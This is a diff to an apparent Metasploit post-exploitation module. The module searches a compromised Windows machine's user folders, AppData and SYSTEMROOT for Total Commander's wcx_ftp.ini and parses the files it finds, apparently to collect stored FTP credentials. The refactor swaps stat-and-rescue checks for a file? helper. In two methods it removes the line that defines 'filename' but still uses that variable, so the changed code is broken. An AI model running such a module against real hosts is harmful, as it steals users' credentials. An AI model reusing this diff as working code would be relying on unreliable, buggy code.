@@ -11,11 +11,14 @@ require 'rex/parser/ini'
 require 'msf/core/post/windows/user_profiles'
 require 'msf/core/post/windows/registry'
 require 'msf/core/auxiliary/report'
+require 'msf/core/post/file'
 
 class Metasploit3 < Msf::Post
+
 	include Msf::Post::Windows::Registry
 	include Msf::Auxiliary::Report
 	include Msf::Post::Windows::UserProfiles
+	include Msf::Post::File
 
 
 	def initialize(info={})
@@ -99,49 +102,39 @@ class Metasploit3 < Msf::Post
 
 
 	def check_userdir(path)
-		filename= "#{path}wcx_ftp.ini"
-		begin
-			iniexists = client.fs.file.stat(filename)
+		if file?("#{path}wcx_ftp.ini")
 			print_status("Found File at #{filename}")
 			get_ini(filename)
-
-		rescue
+		else
 			print_status("#{filename} not found ....")
 		end
 
 	end
 
 	def check_appdata(path)
-		filename= "#{path}\\GHISLER\\wcx_ftp.ini"
-		begin
-			iniexists = client.fs.file.stat(filename)
+		if file?("#{path}\\GHISLER\\wcx_ftp.ini")
 			print_status("Found File at #{filename}")
 			get_ini(filename)
-
-		rescue
+		else
 			print_status("#{filename} not found ....")
 		end
-
 	end
 
 	def check_systemroot
-		winpath= client.fs.file.expand_path("%SYSTEMROOT%")+'\\wcx_ftp.ini'
-		begin
-			iniexists = client.fs.file.stat(winpath)
+		winpath = client.fs.file.expand_path("%SYSTEMROOT%")+'\\wcx_ftp.ini'
+		if file?(winpath)
 			print_status("Found File at #{winpath}")
 			get_ini(winpath)
-		rescue
+		else
 			print_status("#{winpath} not found ....")
 		end
 	end
 
 	def check_other(filename)
-		begin
-			iniexists = client.fs.file.stat(filename)
+		if file?(filename)
 			print_status("Found File at #{filename}")
 			get_ini(filename)
-
-		rescue
+		else
 			print_status("#{filename} not found ....")
 		end
 	end
